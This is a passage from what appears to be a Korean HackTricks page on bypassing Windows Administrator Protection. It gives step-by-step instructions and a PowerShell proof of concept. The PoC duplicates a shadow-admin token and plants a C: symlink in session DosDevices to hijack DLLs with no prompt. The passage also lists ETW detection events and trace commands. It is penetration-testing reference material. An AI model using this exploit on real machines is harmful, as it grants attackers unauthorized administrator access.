1. low-privileged session에서 `RAiProcessRunOnce`를 호출하여 promptless shadow-admin `runonce.exe`를 spawn합니다.
2. primary token을 **identification** token으로 Duplicate하고, `\??`를 여는 동안 이를 impersonate하여 `\Sessions\0\DosDevices/<LUID>`가 공격자 소유로 생성되도록 합니다.
3. 해당 위치에 공격자가 제어하는 storage를 가리키는 `C:` symlink를 생성합니다. 이후 해당 session의 filesystem access는 `C:`를 공격자 path로 resolve하므로 prompt 없이 DLL/file hijack을 수행할 수 있습니다.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
Preview 호스트에서 Administrator Protection은 `Microsoft-Windows-LUA` provider 아래에서 승인 및 실패를 ETW events **15031** 및 **15032**로 기록합니다. 해당 events에는 requester SID, application path, outcome, managed administrator account 및 authentication method가 포함되므로, 반복적인 exploit 시도나 실패한 UI driving도 telemetry-free 상태가 아닙니다.<sup>[[10]](#references)</sup>
```cmd
logman start AdminProtectionTrace -p {93c05d69-51a3-485e-877f-1806a8731346} -ets
rem reproduce the elevation attempt
logman stop AdminProtectionTrace -ets
```
## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Microsoft Docs – User Account Control 작동 방식](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – UAC bypass 기법 모음](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – UAC bypass 호환성 스캐너 및 실행기](https://github.com/rootm0s/WinPwnage)
- [5] [Checkpoint Research – KONNI, AI를 도입해 PowerShell 백도어 생성](https://research.checkpoint.com/2026/konni-targets-developers-with-ai-malware/)
- [6] [Check Point Research – Operation TrueChaos: 동남아시아 정부 대상 0-Day Exploitation](https://research.checkpoint.com/2026/operation-truechaos-0-day-exploitation-against-southeast-asian-government-targets/)
- [7] [Project Zero – Windows Administrator Protection 우회](https://projectzero.google/2026/26/windows-administrator-protection.html)
- [8] [Sigma / Detection.FYI – SilentCleanup Task를 사용한 UAC Bypass](https://detection.fyi/sigmahq/sigma/windows/registry/registry_set/registry_set_bypass_uac_using_silentcleanup_task/)
- [9] [R41N3RZUF477 – UnifiedConsent, TabTip 및 Narrator Always Notify bypasses](https://github.com/hfiref0x/UACME/issues/173)
- [10] [Microsoft Learn – Administrator protection](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/administrator-protection/)
{{#include ../../banners/hacktricks-training.md}}
